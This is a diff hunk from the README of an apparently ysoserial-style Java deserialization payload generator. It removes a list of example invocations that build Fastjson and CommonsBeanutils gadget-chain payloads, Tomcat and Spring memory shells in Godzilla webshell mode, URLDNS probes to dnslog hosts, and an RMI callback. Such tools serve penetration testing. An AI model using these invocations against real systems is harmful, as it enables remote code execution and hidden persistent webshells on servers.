@@ -423,27 +423,3 @@ eg. `-g ROME -cmd "open -a Calculator.app" -wrap`
 >
 > https://gv7.me/articles/2021/construct-java-detection-class-deserialization-gadget/
 
-```
--e JavaClass -jht MemShell -mw Spring -ms Interceptor -msf Godzilla -je FreeMarker
-
--e JavaClass -jht RceEcho -mw Tomcat
-
--g Fastjson -e JavaClass -jht RceEcho -mw Tomcat -save dev/result.bin
-
--g Fastjson -e JavaClass -jht RceEcho -mw Tomcat -jt AutoFind -save dev/result.bin
-
--g Fastjson -e JavaClass -jht RceEcho -mw Tomcat -save dev/result.bin
-
--g Fastjson -e JavaClass -jht Custom -jfp /Users/ppp/Documents/pppRepository/github_file/PPPYSO/dev/poc/testms -save dev/result.bin
-
-
--g URLDNS -host x5i1zb.dnslog.cn -dp "all"
--g URLDNS -host h071jpli.dnslog.pw -dp "all" -save dev/result.bin
-
--g CommonsBeanutils1 -e JavaClass -jht RceEcho -mw Tomcat -cb 1.8.3 -save dev/result.bin
-
--g CommonsBeanutils1 -cmd "open -a Calculator.app" -cb 1.8.3 -save dev/result.bin
-
--g CommonsBeanutils3 -cmd "rmi://127.0.0.1:1099/lwr6se" -cb 1.8.3 -save dev/result.bin
-```
-
